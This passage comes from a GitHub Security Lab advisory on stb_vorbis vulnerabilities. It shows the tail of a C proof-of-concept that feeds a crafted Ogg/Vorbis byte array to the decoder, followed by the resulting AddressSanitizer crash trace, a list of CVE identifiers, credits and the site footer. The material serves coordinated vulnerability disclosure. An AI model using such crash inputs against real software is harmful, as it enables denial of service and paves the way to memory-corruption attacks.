                            <span class="mh">0x05</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xc2</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0xda</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0x37</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0xf3</span><span class="p">,</span><span class="mh">0xd4</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span>
                            <span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span>
                            <span class="mh">0x8c</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span>
                            <span class="mh">0xf0</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xa3</span><span class="p">,</span><span class="mh">0xc3</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span>
                            <span class="mh">0x24</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xdc</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0xfc</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span>
                            <span class="mh">0xb3</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">chan</span><span class="p">,</span> <span class="n">samplerate</span><span class="p">;</span>
    <span class="kt">short</span> <span class="o">*</span><span class="n">output</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">samples</span> <span class="o">=</span> <span class="n">stb_vorbis_decode_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chan</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">samplerate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">samples</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddressSanitizer:DEADLYSIGNAL
=================================================================
==241158==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x0000005001e0 bp 0x7ffc7060a860 sp 0x7ffc70608e40 T0)
==241158==The signal is caused by a READ memory access.
    #0 0x5001e0 in vorbis_decode_packet_rest(stb_vorbis*, int*, Mode*, int, int, int, int, int*) tests/../stb_vorbis.c:3231:22
    #1 0x4e1480 in vorbis_decode_packet(stb_vorbis*, int*, int*, int*) tests/../stb_vorbis.c:3453:11
    #2 0x4f4628 in vorbis_pump_first_frame(stb_vorbis*) tests/../stb_vorbis.c:3512:10
    #3 0x4f94b6 in stb_vorbis_open_memory tests/../stb_vorbis.c:5116:10
    #4 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20
</code></pre></div></div>

<h2 id="cve">CVE</h2>

<ul>
  <li>GHSL-2023-145 - CVE-2023-45661</li>
  <li>GHSL-2023-146 - CVE-2023-45662</li>
  <li>GHSL-2023-147 - CVE-2023-45663</li>
  <li>GHSL-2023-148 - CVE-2023-45664</li>
  <li>GHSL-2023-150 - CVE-2023-45666</li>
  <li>GHSL-2023-151 - CVE-2023-45667</li>
  <li>GHSL-2023-165 - CVE-2023-45675</li>
  <li>GHSL-2023-166 - CVE-2023-45676</li>
  <li>GHSL-2023-167 - CVE-2023-45677</li>
  <li>GHSL-2023-168 - CVE-2023-45678</li>
  <li>GHSL-2023-169 - CVE-2023-45679</li>
  <li>GHSL-2023-170 - CVE-2023-45680</li>
  <li>GHSL-2023-171 - CVE-2023-45681</li>
  <li>GHSL-2023-172 - CVE-2023-45682</li>
</ul>

<h2 id="credit">Credit</h2>

<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2023-145</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-146</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-147</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-148</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-149</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-150</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-151</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-165</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-166</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-167</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-168</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-169</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-170</code>, <code class="language-plaintext highlighter-rouge">GHSL-2023-171</code> or <code class="language-plaintext highlighter-rouge">GHSL-2023-172</code> in any communication regarding these issues.</p>


    </main>
  </div>

  <div></div>


  <footer class="sc-dVhcbM cBEMHy footer">
  <div class="container-xl py-10">
    <div class="d-flex flex-wrap flex-lg-nowrap flex-md-nowrap ">
      <div class="col-12 col-lg-5 mb-5">
        <a
          href="https://github.com/"
          data-ga-click="Footer, go to home, text:home"
          class="octicon-text-white"
          aria-label="Go to GitHub homepage"
        >
          <svg
            height="30"
            class="octicon octicon-logo-github"
            viewBox="0 0 45 16"
            version="1.1"
            width="84"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"
            ></path>
          </svg>
        </a>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Product</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://github.com/features"
              data-ga-click="Footer, go to features, text:features"
              class="link-item"
              >Features</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/security"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Security</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/team"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Team</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/enterprise"
              data-ga-click="Footer, go to enterprise, text:enterprise"
              class="link-item"
              >Enterprise</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/customer-stories?type=enterprise"
              data-ga-click="Footer, go to customer stories, text:customer stories"
              class="link-item"
              >Customer stories</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/readme"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >The ReadME Project</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/pricing"
              data-ga-click="Footer, go to pricing, text:pricing"
              class="link-item"
              >Pricing</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Resources</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/github/roadmap"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Roadmap</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com/devops/tools/compare/"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item text-nowrap"
              >Compare GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5  col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Platform</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://developer.github.com"
              data-ga-click="Footer, go to api, text:api"
              class="link-item"
              >Developer API</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://partner.github.com/"
              data-ga-click="Footer, go to partner, text:partner"
              class="link-item"
              >Partners</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://atom.io"
              data-ga-click="Footer, go to atom, text:atom"
              class="link-item"
              >Atom</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://electron.atom.io/"
              data-ga-click="Footer, go to electron, text:electron"
              class="link-item"
              >Electron</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://desktop.github.com/"
              data-ga-click="Footer, go to desktop, text:desktop"
              class="link-item"
              >GitHub Desktop</a
            >
          </li>
        </ul>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Support</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to help, text:docs"
              class="link-item"
              href="https://docs.github.com"
              >Docs</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.community"
              data-ga-click="Footer, go to community, text:community"
              class="link-item"
              >Community Forum</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://services.github.com/"
              data-ga-click="Footer, go to professional services, text:professional services"
              class="link-item"
              >Professional Services</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://skills.github.com/"
              data-ga-click="Footer, go to skills, text:skills"
              class="link-item"
              >GitHub Skills</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://githubstatus.com/"
              data-ga-click="Footer, go to status, text:status"
              class="link-item"
              >Status</a
            >
          </li>
          <li class="py-2">
            <a
              data-ga-click="Footer, go to contact, text:contact"
              class="link-item"
              href="https://support.github.com"
              >Contact GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Company</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to about, text:about"
              class="link-item"
              href="https://github.com/about"
              >About</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.blog"
              data-ga-click="Footer, go to blog, text:blog"
              class="link-item"
              >Blog</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Careers</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Press</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Inclusion</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Social Impact</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://shop.github.com"
              data-ga-click="Footer, go to shop, text:shop"
              class="link-item"
              >Shop</a
            >
          </li>
        </ul>
      </div>
    </div>
  </div>
  <div class="bottom-banner">
    <div
      class="container-xl py-4 d-sm-flex flex-wrap flex-justify-between flex-row-reverse flex-items-center"
    >
      <ul
        class="list-style-none d-flex flex-wrap flex-items-center mb-3 mb-sm-0 social-icons"
      >
        <li class="mr-3">
          <a
            href="https://twitter.com/github"
            data-ga-click="Footer, go to Twitter, text:twitter"
            title="GitHub on Twitter"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 273.5 222.3"
              class="d-block"
              height="18"
            >
              <path
                d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.facebook.com/GitHub"
            data-ga-click="Footer, go to Facebook, text:facebook"
            title="GitHub on Facebook"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 15.3 15.4"
              class="d-block"
              height="18"
            >
              <path
                d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.youtube.com/github"
            data-ga-click="Footer, go to YouTube, text:youtube"
            title="GitHub on YouTube"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19.17 13.6"
              class="d-block"
              height="16"
            >
              <path
                d="M18.77 2.13A2.4 2.4 0 0 0 17.09.42C15.59 0 9.58 0 9.58 0a57.55 57.55 0 0 0-7.5.4A2.49 2.49 0 0 0 .39 2.13 26.27 26.27 0 0 0 0 6.8a26.15 26.15 0 0 0 .39 4.67 2.43 2.43 0 0 0 1.69 1.71c1.52.42 7.5.42 7.5.42a57.69 57.69 0 0 0 7.51-.4 2.4 2.4 0 0 0 1.68-1.71 25.63 25.63 0 0 0 .4-4.67 24 24 0 0 0-.4-4.69zM7.67 9.71V3.89l5 2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.linkedin.com/company/github"
            data-ga-click="Footer, go to Linkedin, text:linkedin"
            title="GitHub on Linkedin"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19 18"
              class="d-block"
              height="18"
            >
              <path
                d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li>
          <a
            href="https://github.com/github"
            data-ga-click="Footer, go to github's org, text:github"
            title="GitHub's organization"
          >
            <svg
              height="20"
              class="octicon octicon-mark-github d-block"
              viewBox="0 0 16 16"
              version="1.1"
              width="20"
              aria-hidden="true"
            >
              <path
                fill-rule="evenodd"
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              ></path>
            </svg>
          </a>
        </li>
      </ul>
      <ul class="list-style-none d-flex flex-wrap bottom-links-text">
        <li class="mr-3">
          GitHub Inc. ©
          <!-- -->2024<!-- -->
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-terms-of-service"
            data-ga-click="Footer, go to terms, text:terms"
            class="link-gray"
            >Terms</a
          >
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-privacy-statement"
            data-ga-click="Footer, go to privacy, text:privacy"
            class="link-gray"
            >Privacy</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="#"
            data-ga-click="Footer, go to terms, text:sitemap"
            class="link-gray"
            >Sitemap</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="https://github.com/git-guides"
            data-ga-click="Footer, go to terms, text:what is git"
            class="link-gray"
            >What is Git?</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md"><a href="#" class="link-gray">Manage Cookies</a></li>
        <li class="mr-3 hide-sm hide-md">
          <a href="#" class="link-gray">Do not share my personal information</a>
        </li>
      </ul>
    </div>
  </div>
</footer>


  <!-- JAVASCRIPT -->
  <script src="/assets/js/main.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      if (document.body.classList.contains('page-blog')) {

      const eventFooter = document.querySelector('.event-footer');
      const mainFooter = document.querySelector('footer'); // Adjust this selector to match your footer element

      function checkFooterPosition() {
        const footerRect = mainFooter.getBoundingClientRect();
        const eventFooterRect = eventFooter.getBoundingClientRect();

        if (footerRect.top < window.innerHeight && footerRect.bottom >= 0) {
          eventFooter.style.position = 'relative';
          eventFooter.style.bottom = `0px`;
        } else {
          eventFooter.style.position = 'fixed';
          eventFooter.style.bottom = '0';
        }
      }

      window.addEventListener('scroll', checkFooterPosition);
      window.addEventListener('resize', checkFooterPosition);
      checkFooterPosition(); // Initial check
    }
    });
  </script>
</body>
</html>
